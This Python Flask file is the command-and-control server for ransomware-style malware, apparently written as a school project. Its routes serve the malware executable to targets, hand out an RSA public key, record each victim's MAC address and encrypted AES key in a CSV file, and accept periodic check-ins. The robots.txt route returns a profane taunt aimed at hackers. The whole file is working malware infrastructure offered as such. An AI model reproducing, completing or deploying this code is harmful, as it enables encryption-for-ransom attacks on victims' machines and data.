from flask import Flask, send_file, request
import os
import csv
import datetime
from Crypto.PublicKey import RSA



app = Flask(__name__)
"""
Route: N/a
Request: GET
Args: N/A
"""
@app.route("/")
def home():
    return "Hello, World!"


"""
Route: robots.txt
Request: GET
Args: N/A
Action: reply bad words
"""
@app.route("/robots.txt", methods=['GET'])
def test():
    return "FUCK YOU H$CK3R I am just making a skool Project!"



"""
Route: Download
Request: GET
Args: N/A
Action: Downlaods the executable file of the malware to the target
"""
@app.route("/Download",  methods=['GET'])
def downloadFile ():
    #For windows you need to use drive name [ex: F:/Example.pdf]
    path = "a.out"
    return send_file(path, as_attachment=True)



"""
Route: SendMacEncKey
Request: POST
Args: 
    Mac: Mac address of the computer 
    Enc: AES encrypted priv key with the public key and base64.
Action: target sends the Mac addy and the encrypted key 
"""
@app.route("/SendMacEncKey",  methods=['POST'])
def StoreEncKey ():
    datas = ""
    try:
        MacAddy = request.form['Mac']
        EncKey  = request.form['EncKey']
        time    = datetime.datetime.now()
    except RuntimeError as err:
        print("Error")
    
    fields=[MacAddy, EncKey, time]
    if os.path.isfile('Infodb.csv'):
        print ("Using known Info db")
        found = False
        with open('Infodb.csv', 'r', newline='') as file:
            reader = csv.reader(file)
            for row in reader:
                if MacAddy in row[0]:
                    found = True
                    break
        file.close()
        if found == False:
            with open('Infodb.csv', 'a', newline='') as file:
                writer = csv.writer(file)
                writer.writerow(fields)
    else:
        print("Generating new Info db")
        with open('Infodb.csv', 'w', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(["MacAddress", "AESkey", "LastAccess"])
            writer.writerow(fields)
    file.close()
    return "merp"
    


"""
Route: GetKey
Request: GET
Args: N/A
Action: target receives a public key
"""
@app.route("/GetKey",  methods=['GET'])
def getKey():
    if os.path.isfile('RSAMalwareKey.pem'):
        print ("Using known private key file")
        f = open('RSAMalwareKey.pem','r')
        key = RSA.importKey(f.read())
        f.close()
    else:
        print("Generating new private key")
        key = RSA.generate(2048)
        print (key.exportKey('PEM'))
        f = open('RSAMalwareKey.pem','wb')
        f.write(key.exportKey('PEM'))
        f.close()
    # pubKey = key.publickey()
    # privKey = key.exportKey('PEM')
    #return key
    return key.publickey().exportKey('PEM')
    


"""
Route: Status
Request: GET
Args: 
    Mac: Mac address
Action: Lets the C2 server know every five minutes that we are online
"""
@app.route("/Status",  methods=['GET'])
def status():
    MacAddy = request.args["Mac"]
    if os.path.isfile('Infodb.csv'):
        print ("Using known Info db")
        Row_Found = -1
        with open('Infodb.csv', 'r', newline='') as file:
            reader = csv.reader(file)
            for row in reader:
                if MacAddy in row[0]:
                    Row_Found = row
                    break
        file.close()
        print(Row_Found)
        return "2"
    else: 
        return "Nothing Homie"
    


if __name__ == "__main__":
    app.run(debug=True, port=5000)